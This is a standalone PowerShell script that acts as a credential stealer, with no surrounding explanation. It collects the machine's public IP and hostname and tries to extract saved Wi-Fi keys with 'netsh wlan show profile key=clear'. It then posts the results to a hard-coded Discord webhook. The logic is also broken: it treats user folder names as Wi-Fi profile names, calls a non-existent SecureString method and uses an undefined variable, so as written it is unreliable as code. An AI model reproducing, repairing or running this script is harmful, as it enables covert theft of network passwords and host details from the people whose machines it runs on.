$ip = Invoke-RestMethod -Uri "https://api.ipify.org"
$computername = hostname
$message = @{content="$ip | $computername"}

foreach ($user in Get-ChildItem "C:\Users" -Directory) {
    $username = $user.Name
    $password = try { (New-Object -TypeName System.Security.SecureString).AppendChars((netsh.exe wlan show profile name="$username" key=clear) -match "Key Content[\s\S]*?(?:\r?\n(?!(?:[ \t\r\n])*\r?$)[\s\S]*)*" | Out-Null; $matches[0].Split(':')[1].Trim()) }
    catch { "Error: Could not retrieve password for user $username" }
    $message.content += "`n$username - $password"
}

$username = $env:USERNAME
$password = try { (New-Object -TypeName System.Security.SecureString).AppendChars((netsh.exe wlan show profile name="$username" key=clear) -match "Key Content[\s\S]*?(?:\r?\n(?!(?:[ \t\r\n])*\r?$)[\s\S]*)*" | Out-Null; $matches[0].Split(':')[1].Trim()) }
catch { "Error: Could not retrieve password for user $username" }
$message.content += "`n$currentuser - $password"

$url = "https://discordapp.com/api/webhooks/1079012214436024320/HFm3IVe3qFY3j5i9ExU9L4MBOLcKlPR0eahSG_-HBrZJDyYOVxKgkozVAhWjhQwTboI9"
Invoke-WebRequest -Uri $url -Method Post -Body (ConvertTo-Json $message) -ContentType 'application/json'
